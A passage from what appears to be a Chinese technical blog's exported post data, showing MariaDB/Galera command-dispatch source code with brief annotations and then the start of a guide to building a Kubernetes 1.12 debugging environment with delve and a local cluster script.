/* Performance Schema Interface instrumentation, begin */\n  thd->m_statement_psi= MYSQL_REFINE_STATEMENT(thd->m_statement_psi,\n                                               com_statement_info[command].\n                                               m_key);\n  thd->set_command(command);\n\n  /*\n    Commands which always take a long time are logged into\n    the slow log only if opt_log_slow_admin_statements is set.\n  */\n  thd->enable_slow_log= thd->variables.sql_log_slow;\n  thd->query_plan_flags= QPLAN_INIT;\n  thd->lex->sql_command= SQLCOM_END; /* to avoid confusing VIEW detectors */\n  thd->reset_kill_query();\n\n  DEBUG_SYNC(thd,\"dispatch_command_before_set_time\");\n\n  thd->set_time();\n  if (!(server_command_flags[command] & CF_SKIP_QUERY_ID))\n    thd->set_query_id(next_query_id());\n  else\n  {\n    /*\n      ping, get statistics or similar stateless command.\n      No reason to increase query id here.\n    */\n    thd->set_query_id(get_query_id());\n  }\n\n  if (!(server_command_flags[command] & CF_SKIP_QUESTIONS))\n    statistic_increment(thd->status_var.questions, &LOCK_status);\n\n  /* Copy data for user stats */\n  if ((thd->userstat_running= opt_userstat_running))\n  {\n    thd->start_cpu_time= my_getcputime();\n    memcpy(&thd->org_status_var, &thd->status_var, sizeof(thd->status_var));\n    thd->select_commands= thd->update_commands= thd->other_commands= 0;\n  }\n\n  /**\n    Clear the set of flags that are expected to be cleared at the\n    beginning of each command.\n  */\n  thd->server_status&= ~SERVER_STATUS_CLEAR_SET;\n  switch (command) {\n  case COM_INIT_DB:\n  {\n    LEX_STRING tmp;\n    status_var_increment(thd->status_var.com_stat[SQLCOM_CHANGE_DB]);\n    if (thd->copy_with_error(system_charset_info, &tmp,\n                             thd->charset(), packet, packet_length))\n      break;\n    if (!mysql_change_db(thd, &tmp, FALSE))\n    {\n      general_log_write(thd, command, thd->db, thd->db_length);\n      my_ok(thd);\n    }\n    break;\n  }\n#ifdef HAVE_REPLICATION\n  case COM_REGISTER_SLAVE:\n  {\n    status_var_increment(thd->status_var.com_register_slave);\n    if (!register_slave(thd, (uchar*)packet, packet_length))\n      my_ok(thd);\n    break;\n  }\n#endif\n  case COM_CHANGE_USER:\n  {\n    int auth_rc;\n    status_var_increment(thd->status_var.com_other);\n\n    thd->change_user();\n    thd->clear_error();                         // if errors from rollback\n\n    /* acl_authenticate() takes the data from net->read_pos */\n    net->read_pos= (uchar*)packet;\n\n    uint save_db_length= thd->db_length;\n    char *save_db= thd->db;\n    USER_CONN *save_user_connect= thd->user_connect;\n    Security_context save_security_ctx= *thd->security_ctx;\n    CHARSET_INFO *save_character_set_client=\n      thd->variables.character_set_client;\n    CHARSET_INFO *save_collation_connection=\n      thd->variables.collation_connection;\n    CHARSET_INFO *save_character_set_results=\n      thd->variables.character_set_results;\n\n    /* Ensure we don't free security_ctx->user in case we have to revert */\n    thd->security_ctx->user= 0;\n    thd->user_connect= 0;\n\n    /*\n      to limit COM_CHANGE_USER ability to brute-force passwords,\n      we only allow three unsuccessful COM_CHANGE_USER per connection.\n    */\n    if (thd->failed_com_change_user >= 3)\n    {\n      my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd,ER_UNKNOWN_COM_ERROR),\n                 MYF(0));\n      auth_rc= 1;\n    }\n    else\n      auth_rc= acl_authenticate(thd, packet_length);\n\n    mysql_audit_notify_connection_change_user(thd);\n    if (auth_rc)\n    {\n      /* Free user if allocated by acl_authenticate */\n      my_free(thd->security_ctx->user);\n      *thd->security_ctx= save_security_ctx;\n      if (thd->user_connect)\n\tdecrease_user_connections(thd->user_connect);\n      thd->user_connect= save_user_connect;\n      thd->reset_db(save_db, save_db_length);\n      thd->variables.character_set_client= save_character_set_client;\n      thd->variables.collation_connection= save_collation_connection;\n      thd->variables.character_set_results= save_character_set_results;\n      thd->update_charset();\n      thd->failed_com_change_user++;\n      my_sleep(1000000);\n    }\n    else\n    {\n#ifndef NO_EMBEDDED_ACCESS_CHECKS\n      /* we've authenticated new user */\n      if (save_user_connect)\n\tdecrease_user_connections(save_user_connect);\n#endif /* NO_EMBEDDED_ACCESS_CHECKS */\n      my_free(save_db);\n      my_free(save_security_ctx.user);\n    }\n    break;\n  }\n  case COM_STMT_EXECUTE:\n  {\n    mysqld_stmt_execute(thd, packet, packet_length);\n    break;\n  }\n  case COM_STMT_FETCH:\n  {\n    mysqld_stmt_fetch(thd, packet, packet_length);\n    break;\n  }\n  case COM_STMT_SEND_LONG_DATA:\n  {\n    mysql_stmt_get_longdata(thd, packet, packet_length);\n    break;\n  }\n  case COM_STMT_PREPARE:\n  {\n    mysqld_stmt_prepare(thd, packet, packet_length);\n    break;\n  }\n  case COM_STMT_CLOSE:\n  {\n    mysqld_stmt_close(thd, packet);\n    break;\n  }\n  case COM_STMT_RESET:\n  {\n    mysqld_stmt_reset(thd, packet);\n    break;\n  }\n  case COM_QUERY: //查询语句\n  {\n      \n    DBUG_ASSERT(thd->m_digest == NULL);\n    thd->m_digest= & thd->m_digest_state;\n    thd->m_digest->reset(thd->m_token_array, max_digest_length);\n\n    if (alloc_query(thd, packet, packet_length))\n      break;\t\t\t\t\t// fatal error is set\n    MYSQL_QUERY_START(thd->query(), thd->thread_id,\n                      (char *) (thd->db ? thd->db : \"\"),\n                      &thd->security_ctx->priv_user[0],\n                      (char *) thd->security_ctx->host_or_ip);\n    char *packet_end= thd->query() + thd->query_length();\n    general_log_write(thd, command, thd->query(), thd->query_length());\n    DBUG_PRINT(\"query\",(\"%-.4096s\",thd->query()));\n#if defined(ENABLED_PROFILING)\n    thd->profiling.set_query_source(thd->query(), thd->query_length());\n#endif\n    MYSQL_SET_STATEMENT_TEXT(thd->m_statement_psi, thd->query(),\n                             thd->query_length());\n\n    Parser_state parser_state;\n    if (parser_state.init(thd, thd->query(), thd->query_length()))\n      break;\n\n    if (WSREP_ON)\n      wsrep_mysql_parse(thd, thd->query(), thd->query_length(), &parser_state);   //wsrep_mysql_parse执行\n    else\n      mysql_parse(thd, thd->query(), thd->query_length(), &parser_state); //否则使用mysql_parse执行\n\n    while (!thd->killed && (parser_state.m_lip.found_semicolon != NULL) &&\n           ! thd->is_error())\n    {\n      /*\n        Multiple queries exist, execute them individually\n      */\n      char *beginning_of_next_stmt= (char*) parser_state.m_lip.found_semicolon;\n\n#ifdef WITH_ARIA_STORAGE_ENGINE\n    ha_maria::implicit_commit(thd, FALSE);\n#endif\n\n      /* Finalize server status flags after executing a statement. */\n      thd->update_server_status();\n      thd->protocol->end_statement();\n      query_cache_end_of_result(thd);\n\n      mysql_audit_general(thd, MYSQL_AUDIT_GENERAL_STATUS,\n                          thd->get_stmt_da()->is_error()\n                            ? thd->get_stmt_da()->sql_errno()\n                            : 0,\n                          command_name[command].str);\n\n      ulong length= (ulong)(packet_end - beginning_of_next_stmt);\n\n      log_slow_statement(thd);\n      DBUG_ASSERT(!thd->apc_target.is_enabled());\n\n      /* Remove garbage at start of query */\n      while (length > 0 && my_isspace(thd->charset(), *beginning_of_next_stmt))\n      {\n        beginning_of_next_stmt++;\n        length--;\n      }\n\n      /* PSI end */\n      MYSQL_END_STATEMENT(thd->m_statement_psi, thd->get_stmt_da());\n      thd->m_statement_psi= NULL;\n      thd->m_digest= NULL;\n\n      /* DTRACE end */\n      if (MYSQL_QUERY_DONE_ENABLED())\n      {\n        MYSQL_QUERY_DONE(thd->is_error());\n      }\n\n#if defined(ENABLED_PROFILING)\n      thd->profiling.finish_current_query();\n      thd->profiling.start_new_query(\"continuing\");\n      thd->profiling.set_query_source(beginning_of_next_stmt, length);\n#endif\n\n      /* DTRACE begin */\n      MYSQL_QUERY_START(beginning_of_next_stmt, thd->thread_id,\n                        (char *) (thd->db ? thd->db : \"\"),\n                        &thd->security_ctx->priv_user[0],\n                        (char *) thd->security_ctx->host_or_ip);\n\n      /* PSI begin */\n      thd->m_digest= & thd->m_digest_state;\n\n      thd->m_statement_psi= MYSQL_START_STATEMENT(&thd->m_statement_state,\n                                                  com_statement_info[command].m_key,\n                                                  thd->db, thd->db_length,\n                                                  thd->charset());\n      THD_STAGE_INFO(thd, stage_init);\n      MYSQL_SET_STATEMENT_TEXT(thd->m_statement_psi, beginning_of_next_stmt,\n                               length);\n\n      thd->set_query_and_id(beginning_of_next_stmt, length,\n                            thd->charset(), next_query_id());\n      /*\n        Count each statement from the client.\n      */\n      statistic_increment(thd->status_var.questions, &LOCK_status);\n\n      if(!WSREP(thd))\n\tthd->set_time(); /* Reset the query start time. */\n\n      parser_state.reset(beginning_of_next_stmt, length);\n      /* TODO: set thd->lex->sql_command to SQLCOM_END here */\n\n      if (WSREP_ON)\n        wsrep_mysql_parse(thd, beginning_of_next_stmt, length, &parser_state);   //执行wsrep_mysql_parse\n      else\n        mysql_parse(thd, beginning_of_next_stmt, length, &parser_state);\n\n    }\n\n    DBUG_PRINT(\"info\",(\"query ready\"));\n    break;\n  }\n  case COM_FIELD_LIST:\t\t\t\t// This isn't actually needed\n#ifdef DONT_ALLOW_SHOW_COMMANDS\n    my_message(ER_NOT_ALLOWED_COMMAND, ER_THD(thd, ER_NOT_ALLOWED_COMMAND),\n               MYF(0));\t/* purecov: inspected */\n    break;\n#else\n  {\n    char *fields, *packet_end= packet + packet_length, *arg_end;\n    /* Locked closure of all tables */\n    TABLE_LIST table_list;\n    LEX_STRING table_name;\n    LEX_STRING db;\n    /*\n      SHOW statements should not add the used tables to the list of tables\n      used in a transaction.\n    */\n    MDL_savepoint mdl_savepoint= thd->mdl_context.mdl_savepoint();\n\n    status_var_increment(thd->status_var.com_stat[SQLCOM_SHOW_FIELDS]);\n    if (thd->copy_db_to(&db.str, &db.length))\n      break;\n    /*\n      We have name + wildcard in packet, separated by endzero\n      (The packet is guaranteed to end with an end zero)\n    */\n    arg_end= strend(packet);\n    uint arg_length= arg_end - packet;\n\n    /* Check given table name length. */\n    if (packet_length - arg_length > NAME_LEN + 1 || arg_length > SAFE_NAME_LEN)\n    {\n      my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd, ER_UNKNOWN_COM_ERROR),\n                 MYF(0));\n      break;\n    }\n    thd->convert_string(&table_name, system_charset_info,\n\t\t\tpacket, arg_length, thd->charset());\n    if (check_table_name(table_name.str, table_name.length, FALSE))\n    {\n      /* this is OK due to convert_string() null-terminating the string */\n      my_error(ER_WRONG_TABLE_NAME, MYF(0), table_name.str);\n      break;\n    }\n    packet= arg_end + 1;\n    thd->reset_for_next_command();\n    lex_start(thd);\n    /* Must be before we init the table list. */\n    if (lower_case_table_names)\n    {\n      table_name.length= my_casedn_str(files_charset_info, table_name.str);\n      db.length= my_casedn_str(files_charset_info, db.str);\n    }\n    table_list.init_one_table(db.str, db.length, table_name.str,\n                              table_name.length, table_name.str, TL_READ);\n    /*\n      Init TABLE_LIST members necessary when the undelrying\n      table is view.\n    */\n    table_list.select_lex= &(thd->lex->select_lex);\n    thd->lex->\n      select_lex.table_list.link_in_list(&table_list,\n                                         &table_list.next_local);\n    thd->lex->add_to_query_tables(&table_list);\n\n    if (is_infoschema_db(table_list.db, table_list.db_length))\n    {\n      ST_SCHEMA_TABLE *schema_table= find_schema_table(thd, table_list.alias);\n      if (schema_table)\n        table_list.schema_table= schema_table;\n    }\n\n    uint query_length= (uint) (packet_end - packet); // Don't count end \\0\n    if (!(fields= (char *) thd->memdup(packet, query_length + 1)))\n      break;\n    thd->set_query(fields, query_length);\n    general_log_print(thd, command, \"%s %s\", table_list.table_name, fields);\n\n    if (open_temporary_tables(thd, &table_list))\n      break;\n\n    if (check_table_access(thd, SELECT_ACL, &table_list,\n                           TRUE, UINT_MAX, FALSE))\n      break;\n    /*\n      Turn on an optimization relevant if the underlying table\n      is a view: do not fill derived tables.\n    */\n    thd->lex->sql_command= SQLCOM_SHOW_FIELDS;\n\n    mysqld_list_fields(thd,&table_list,fields);\n    thd->lex->unit.cleanup();\n    /* No need to rollback statement transaction, it's not started. */\n    DBUG_ASSERT(thd->transaction.stmt.is_empty());\n    close_thread_tables(thd);\n    thd->mdl_context.rollback_to_savepoint(mdl_savepoint);\n\n    if (thd->transaction_rollback_request)\n    {\n      /*\n        Transaction rollback was requested since MDL deadlock was\n        discovered while trying to open tables. Rollback transaction\n        in all storage engines including binary log and release all\n        locks.\n      */\n      trans_rollback_implicit(thd);\n      thd->mdl_context.release_transactional_locks();\n    }\n\n    thd->cleanup_after_query();\n    break;\n  }\n#endif\n  case COM_QUIT:\n    /* We don't calculate statistics for this command */\n    general_log_print(thd, command, NullS);\n    net->error=0;\t\t\t\t// Don't give 'abort' message\n    thd->get_stmt_da()->disable_status();       // Don't send anything back\n    error=TRUE;\t\t\t\t\t// End server\n    break;\n#ifndef EMBEDDED_LIBRARY\n  case COM_BINLOG_DUMP:\n    {\n      ulong pos;\n      ushort flags;\n      uint32 slave_server_id;\n\n      status_var_increment(thd->status_var.com_other);\n\n      thd->enable_slow_log&= opt_log_slow_admin_statements;\n      thd->query_plan_flags|= QPLAN_ADMIN;\n      if (check_global_access(thd, REPL_SLAVE_ACL))\n\tbreak;\n\n      /* TODO: The following has to be changed to an 8 byte integer */\n      pos = uint4korr(packet);\n      flags = uint2korr(packet + 4);\n      thd->variables.server_id=0; /* avoid suicide */\n      if ((slave_server_id= uint4korr(packet+6))) // mysqlbinlog.server_id==0\n\tkill_zombie_dump_threads(slave_server_id);\n      thd->variables.server_id = slave_server_id;\n\n      general_log_print(thd, command, \"Log: '%s'  Pos: %ld\", packet+10,\n                      (long) pos);\n      mysql_binlog_send(thd, thd->strdup(packet + 10), (my_off_t) pos, flags);\n      unregister_slave(thd,1,1);\n      /*  fake COM_QUIT -- if we get here, the thread needs to terminate */\n      error = TRUE;\n      break;\n    }\n#endif\n  case COM_REFRESH:\n  {\n    int not_used;\n\n    /*\n      Initialize thd->lex since it's used in many base functions, such as\n      open_tables(). Otherwise, it remains unitialized and may cause crash\n      during execution of COM_REFRESH.\n    */\n    lex_start(thd);\n    \n    status_var_increment(thd->status_var.com_stat[SQLCOM_FLUSH]);\n    ulonglong options= (ulonglong) (uchar) packet[0];\n    if (trans_commit_implicit(thd))\n      break;\n    thd->mdl_context.release_transactional_locks();\n    if (check_global_access(thd,RELOAD_ACL))\n      break;\n    general_log_print(thd, command, NullS);\n#ifndef DBUG_OFF\n    bool debug_simulate= FALSE;\n    DBUG_EXECUTE_IF(\"simulate_detached_thread_refresh\", debug_simulate= TRUE;);\n    if (debug_simulate)\n    {\n      /*\n        Simulate a reload without a attached thread session.\n        Provides a environment similar to that of when the\n        server receives a SIGHUP signal and reloads caches\n        and flushes tables.\n      */\n      bool res;\n      set_current_thd(0);\n      res= reload_acl_and_cache(NULL, options | REFRESH_FAST,\n                                NULL, &not_used);\n      set_current_thd(thd);\n      if (res)\n        break;\n    }\n    else\n#endif\n    {\n      thd->lex->relay_log_connection_name= empty_lex_str;\n      if (reload_acl_and_cache(thd, options, (TABLE_LIST*) 0, &not_used))\n        break;\n    }\n    if (trans_commit_implicit(thd))\n      break;\n    close_thread_tables(thd);\n    thd->mdl_context.release_transactional_locks();\n    my_ok(thd);\n    break;\n  }\n#ifndef EMBEDDED_LIBRARY\n  case COM_SHUTDOWN:\n  {\n    status_var_increment(thd->status_var.com_other);\n    if (check_global_access(thd,SHUTDOWN_ACL))\n      break; /* purecov: inspected */\n    /*\n      If the client is < 4.1.3, it is going to send us no argument; then\n      packet_length is 0, packet[0] is the end 0 of the packet. Note that\n      SHUTDOWN_DEFAULT is 0. If client is >= 4.1.3, the shutdown level is in\n      packet[0].\n    */\n    enum mysql_enum_shutdown_level level;\n    level= (enum mysql_enum_shutdown_level) (uchar) packet[0];\n    if (level == SHUTDOWN_DEFAULT)\n      level= SHUTDOWN_WAIT_ALL_BUFFERS; // soon default will be configurable\n    else if (level != SHUTDOWN_WAIT_ALL_BUFFERS)\n    {\n      my_error(ER_NOT_SUPPORTED_YET, MYF(0), \"this shutdown level\");\n      break;\n    }\n    DBUG_PRINT(\"quit\",(\"Got shutdown command for level %u\", level));\n    general_log_print(thd, command, NullS);\n    my_eof(thd);\n    kill_mysql();\n    error=TRUE;\n    break;\n  }\n#endif\n  case COM_STATISTICS:\n  {\n    STATUS_VAR *current_global_status_var;      // Big; Don't allocate on stack\n    ulong uptime;\n    uint length __attribute__((unused));\n    ulonglong queries_per_second1000;\n    char buff[250];\n    uint buff_len= sizeof(buff);\n\n    if (!(current_global_status_var= (STATUS_VAR*)\n          thd->alloc(sizeof(STATUS_VAR))))\n      break;\n    general_log_print(thd, command, NullS);\n    status_var_increment(thd->status_var.com_stat[SQLCOM_SHOW_STATUS]);\n    calc_sum_of_all_status(current_global_status_var);\n    if (!(uptime= (ulong) (thd->start_time - server_start_time)))\n      queries_per_second1000= 0;\n    else\n      queries_per_second1000= thd->query_id * 1000 / uptime;\n\n    length= my_snprintf(buff, buff_len - 1,\n                        \"Uptime: %lu  Threads: %d  Questions: %lu  \"\n                        \"Slow queries: %lu  Opens: %lu  Flush tables: %lu  \"\n                        \"Open tables: %u  Queries per second avg: %u.%03u\",\n                        uptime,\n                        (int) thread_count, (ulong) thd->query_id,\n                        current_global_status_var->long_query_count,\n                        current_global_status_var->opened_tables,\n                        tdc_refresh_version(),\n                        tc_records(),\n                        (uint) (queries_per_second1000 / 1000),\n                        (uint) (queries_per_second1000 % 1000));\n#ifdef EMBEDDED_LIBRARY\n    /* Store the buffer in permanent memory */\n    my_ok(thd, 0, 0, buff);\n#else\n    (void) my_net_write(net, (uchar*) buff, length);\n    (void) net_flush(net);\n    thd->get_stmt_da()->disable_status();\n#endif\n    break;\n  }\n  case COM_PING:\n    status_var_increment(thd->status_var.com_other);\n    my_ok(thd);\t\t\t\t// Tell client we are alive\n    break;\n  case COM_PROCESS_INFO:\n    status_var_increment(thd->status_var.com_stat[SQLCOM_SHOW_PROCESSLIST]);\n    if (!thd->security_ctx->priv_user[0] &&\n        check_global_access(thd, PROCESS_ACL))\n      break;\n    general_log_print(thd, command, NullS);\n    mysqld_list_processes(thd,\n\t\t\t  thd->security_ctx->master_access & PROCESS_ACL ? \n\t\t\t  NullS : thd->security_ctx->priv_user, 0);\n    break;\n  case COM_PROCESS_KILL:\n  {\n    status_var_increment(thd->status_var.com_stat[SQLCOM_KILL]);\n    ulong id=(ulong) uint4korr(packet);\n    sql_kill(thd, id, KILL_CONNECTION_HARD, KILL_TYPE_ID);\n    break;\n  }\n  case COM_SET_OPTION:\n  {\n    status_var_increment(thd->status_var.com_stat[SQLCOM_SET_OPTION]);\n    uint opt_command= uint2korr(packet);\n\n    switch (opt_command) {\n    case (int) MYSQL_OPTION_MULTI_STATEMENTS_ON:\n      thd->client_capabilities|= CLIENT_MULTI_STATEMENTS;\n      my_eof(thd);\n      break;\n    case (int) MYSQL_OPTION_MULTI_STATEMENTS_OFF:\n      thd->client_capabilities&= ~CLIENT_MULTI_STATEMENTS;\n      my_eof(thd);\n      break;\n    default:\n      my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd, ER_UNKNOWN_COM_ERROR),\n                 MYF(0));\n      break;\n    }\n    break;\n  }\n  case COM_DEBUG:\n    status_var_increment(thd->status_var.com_other);\n    if (check_global_access(thd, SUPER_ACL))\n      break;\t\t\t\t\t/* purecov: inspected */\n    mysql_print_status();\n    general_log_print(thd, command, NullS);\n    my_eof(thd);\n    break;\n  case COM_SLEEP:\n  case COM_CONNECT:\t\t\t\t// Impossible here\n  case COM_TIME:\t\t\t\t// Impossible from client\n  case COM_DELAYED_INSERT:\n  case COM_END:\n  default:\n    my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd, ER_UNKNOWN_COM_ERROR),\n               MYF(0));\n    break;\n  }\n\n#ifdef WITH_WSREP\n dispatch_end:\n\n  if (WSREP(thd))\n  {\n    /* wsrep BF abort in query exec phase */\n    mysql_mutex_lock(&thd->LOCK_wsrep_thd);\n    do_end_of_statement= thd->wsrep_conflict_state != REPLAYING &&\n                         thd->wsrep_conflict_state != RETRY_AUTOCOMMIT;\n    mysql_mutex_unlock(&thd->LOCK_wsrep_thd);\n  }\n  else\n    do_end_of_statement= true;\n\n#endif /* WITH_WSREP */\n\n  if (do_end_of_statement)\n  {\n    DBUG_ASSERT(thd->derived_tables == NULL &&\n               (thd->open_tables == NULL ||\n               (thd->locked_tables_mode == LTM_LOCK_TABLES)));\n\n    thd_proc_info(thd, \"updating status\");\n    /* Finalize server status flags after executing a command. */\n    thd->update_server_status();\n    thd->protocol->end_statement();\n    query_cache_end_of_result(thd);\n  }\n\n  if (!thd->is_error() && !thd->killed_errno())\n    mysql_audit_general(thd, MYSQL_AUDIT_GENERAL_RESULT, 0, 0);\n\n  mysql_audit_general(thd, MYSQL_AUDIT_GENERAL_STATUS,\n                      thd->get_stmt_da()->is_error() ?\n                      thd->get_stmt_da()->sql_errno() : 0,\n                      command_name[command].str);\n\n  thd->update_all_stats();\n\n  log_slow_statement(thd);\n\n  THD_STAGE_INFO(thd, stage_cleaning_up);\n  thd->reset_query();\n  thd->set_examined_row_count(0);                   // For processlist\n  thd->set_command(COM_SLEEP);\n\n  /* Performance Schema Interface instrumentation, end */\n  MYSQL_END_STATEMENT(thd->m_statement_psi, thd->get_stmt_da());\n  thd->m_statement_psi= NULL;\n  thd->m_digest= NULL;\n\n  dec_thread_running();\n  thd->packet.shrink(thd->variables.net_buffer_length);\t// Reclaim some memory\n  free_root(thd->mem_root,MYF(MY_KEEP_PREALLOC));\n\n#if defined(ENABLED_PROFILING)\n  thd->profiling.finish_current_query();\n#endif\n  if (MYSQL_QUERY_DONE_ENABLED() || MYSQL_COMMAND_DONE_ENABLED())\n  {\n    int res __attribute__((unused));\n    res= (int) thd->is_error();\n    if (command == COM_QUERY)\n    {\n      MYSQL_QUERY_DONE(res);\n    }\n    MYSQL_COMMAND_DONE(res);\n  }\n  DEBUG_SYNC(thd,\"dispatch_command_end\");\n\n  /* Check that some variables are reset properly */\n  DBUG_ASSERT(thd->abort_on_warning == 0);\n  thd->lex->restore_set_statement_var();\n  DBUG_RETURN(error);\n}\n```\n\n上面查询语句的时候，在mysql_parse函数之前做了检查。\n\n未完待续\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["galera"],"categories":["mysql"]},{"title":"kubernetes debug环境搭建","url":"/2020/03/02/kubernetes_debug环境搭建/","content":"\n### kubernetes debug环境搭建\n\nk8s debug环境搭建\n\n#### 环境安装：\n\ngo 1.12版本，1.13版本太高，k8s编译有点问题。\n\nk8s 1.12.3版本\n\ncentos 7安装 k8s，进行调试，使用dlv进行调试\n\n安装必须要的组件：\n\n```go\nyum install -y docker wget curl vim golang etcd openssl git\nsystemctl enable docker && systemctl start docker\n```\n\n设置gopath路径，之后安装好必须要的库\n\n```go\ngo get -u -v github.com/cloudflare/cfssl/cmd/...\n```\n\n安装delve调试工具\n\n```go\ngo get -u -v github.com/derekparker/delve/cmd/dlv\n```\n\n ```go\ngit clone https://github.com/kubernetes/kubernetes.git $GOPATH/src/k8s.io/kubernetes\n ```\n\n```go\ngit checkout -b v1.12.3\n```\n\n运行脚本安装和运行\n\n ```go\ncp hack/local-up-cluster.sh hack/local-up-cluster.sh.bak\ntouch hack/local-up-cluster.sh && chmod +x hack/local-up-cluster.sh\n ```\n\n使用下面脚本安装和运行\n\n```shell\n\n#!/bin/bash\n# Copyright 2014 The Kubernetes Authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nset -x\nKUBE_ROOT=$(dirname \"${BASH_SOURCE}\")/..\n# This command builds and runs a local kubernetes cluster.\n# You may need to run this as root to allow kubelet to open docker's socket,\n# and to write the test CA in /var/run/kubernetes.\nDOCKER_OPTS=${DOCKER_OPTS:-\"\"}\nDOCKER=(docker ${DOCKER_OPTS})\nDOCKERIZE_KUBELET=${DOCKERIZE_KUBELET:-\"\"}\nALLOW_PRIVILEGED=${ALLOW_PRIVILEGED:-\"\"}\nDENY_SECURITY_CONTEXT_ADMISSION=${DENY_SECURITY_CONTEXT_ADMISSION:-\"\"}\nPSP_ADMISSION=${PSP_ADMISSION:-\"\"}\nNODE_ADMISSION=${NODE_ADMISSION:-\"\"}\nRUNTIME_CONFIG=${RUNTIME_CONFIG:-\"\"}\nKUBELET_AUTHORIZATION_WEBHOOK=${KUBELET_AUTHORIZATION_WEBHOOK:-\"\"}\nKUBELET_AUTHENTICATION_WEBHOOK=${KUBELET_AUTHENTICATION_WEBHOOK:-\"\"}\nPOD_MANIFEST_PATH=${POD_MANIFEST_PATH:-\"/var/run/kubernetes/static-pods\"}\nKUBELET_FLAGS=${KUBELET_FLAGS:-\"\"}\n# many dev environments run with swap on, so we don't fail in this env\nFAIL_SWAP_ON=${FAIL_SWAP_ON:-\"false\"}\n# Name of the network plugin, eg: \"kubenet\"\nNET_PLUGIN=${NET_PLUGIN:-\"\"}\n# Place the config files and binaries required by NET_PLUGIN in these directory,\n# eg: \"/etc/cni/net.d\" for config files, and \"/opt/cni/bin\" for binaries.\nCNI_CONF_DIR=${CNI_CONF_DIR:-\"\"}\nCNI_BIN_DIR=${CNI_BIN_DIR:-\"\"}\nSERVICE_CLUSTER_IP_RANGE=${SERVICE_CLUSTER_IP_RANGE:-10.0.0.0/24}\nFIRST_SERVICE_CLUSTER_IP=${FIRST_SERVICE_CLUSTER_IP:-10.0.0.1}\n# if enabled, must set CGROUP_ROOT\nCGROUPS_PER_QOS=${CGROUPS_PER_QOS:-true}\n# name of the cgroup driver, i.e. cgroupfs or systemd\nCGROUP_DRIVER=${CGROUP_DRIVER:-\"\"}\n# owner of client certs, default to current user if not specified\nUSER=${USER:-$(whoami)}\n# enables testing eviction scenarios locally.\nEVICTION_HARD=${EVICTION_HARD:-\"memory.available<100Mi,nodefs.available<10%,nodefs.inodesFree<5%\"}\nEVICTION_SOFT=${EVICTION_SOFT:-\"\"}\nEVICTION_PRESSURE_TRANSITION_PERIOD=${EVICTION_PRESSURE_TRANSITION_PERIOD:-\"1m\"}\n# This script uses docker0 (or whatever container bridge docker is currently using)\n# and we don't know the IP of the DNS pod to pass in as --cluster-dns.\n# To set this up by hand, set this flag and change DNS_SERVER_IP.\n# Note also that you need API_HOST (defined above) for correct DNS.\nKUBE_PROXY_MODE=${KUBE_PROXY_MODE:-\"\"}\nENABLE_CLUSTER_DNS=${KUBE_ENABLE_CLUSTER_DNS:-true}\nDNS_SERVER_IP=${KUBE_DNS_SERVER_IP:-10.0.0.10}\nDNS_DOMAIN=${KUBE_DNS_NAME:-\"cluster.local\"}\nKUBECTL=${KUBECTL:-cluster/kubectl.sh}\nWAIT_FOR_URL_API_SERVER=${WAIT_FOR_URL_API_SERVER:-60}\nENABLE_DAEMON=${ENABLE_DAEMON:-false}\nHOSTNAME_OVERRIDE=${HOSTNAME_OVERRIDE:-\"127.0.0.1\"}\nEXTERNAL_CLOUD_PROVIDER=${EXTERNAL_CLOUD_PROVIDER:-false}\nEXTERNAL_CLOUD_PROVIDER_BINARY=${EXTERNAL_CLOUD_PROVIDER_BINARY:-\"\"}\nCLOUD_PROVIDER=${CLOUD_PROVIDER:-\"\"}\nCLOUD_CONFIG=${CLOUD_CONFIG:-\"\"}\nFEATURE_GATES=${FEATURE_GATES:-\"AllAlpha=false\"}\nSTORAGE_BACKEND=${STORAGE_BACKEND:-\"etcd3\"}\n# enable swagger ui\nENABLE_SWAGGER_UI=${ENABLE_SWAGGER_UI:-false}\n# enable Pod priority and preemption\nENABLE_POD_PRIORITY_PREEMPTION=${ENABLE_POD_PRIORITY_PREEMPTION:-\"\"}\n# enable kubernetes dashboard\nENABLE_CLUSTER_DASHBOARD=${KUBE_ENABLE_CLUSTER_DASHBOARD:-false}\n# enable audit log\nENABLE_APISERVER_BASIC_AUDIT=${ENABLE_APISERVER_BASIC_AUDIT:-false}\n# RBAC Mode options\nAUTHORIZATION_MODE=${AUTHORIZATION_MODE:-\"Node,RBAC\"}\nKUBECONFIG_TOKEN=${KUBECONFIG_TOKEN:-\"\"}\nAUTH_ARGS=${AUTH_ARGS:-\"\"}\n# Install a default storage class (enabled by default)\nDEFAULT_STORAGE_CLASS=${KUBE_DEFAULT_STORAGE_CLASS:-true}\n# start the cache mutation detector by default so that cache mutators will be found\nKUBE_CACHE_MUTATION_DETECTOR=\"${KUBE_CACHE_MUTATION_DETECTOR:-true}\"\nexport KUBE_CACHE_MUTATION_DETECTOR\n# panic the server on watch decode errors since they are considered coder mistakes\nKUBE_PANIC_WATCH_DECODE_ERROR=\"${KUBE_PANIC_WATCH_DECODE_ERROR:-true}\"\nexport KUBE_PANIC_WATCH_DECODE_ERROR\nENABLE_ADMISSION_PLUGINS=${ENABLE_ADMISSION_PLUGINS:-\"\"}\nDISABLE_ADMISSION_PLUGINS=${DISABLE_ADMISSION_PLUGINS:-\"\"}\nADMISSION_CONTROL_CONFIG_FILE=${ADMISSION_CONTROL_CONFIG_FILE:-\"\"}\n# START_MODE can be 'all', 'kubeletonly', or 'nokubelet'\nSTART_MODE=${START_MODE:-\"all\"}\n# A list of controllers to enable\nKUBE_CONTROLLERS=\"${KUBE_CONTROLLERS:-\"*\"}\"\n# sanity check for OpenStack provider\nif [ \"${CLOUD_PROVIDER}\" == \"openstack\" ]; then\n    if [ \"${CLOUD_CONFIG}\" == \"\" ]; then\n        echo \"Missing CLOUD_CONFIG env for OpenStack provider!\"\n        exit 1\n    fi\n    if [ ! -f \"${CLOUD_CONFIG}\" ]; then\n        echo \"Cloud config ${CLOUD_CONFIG} 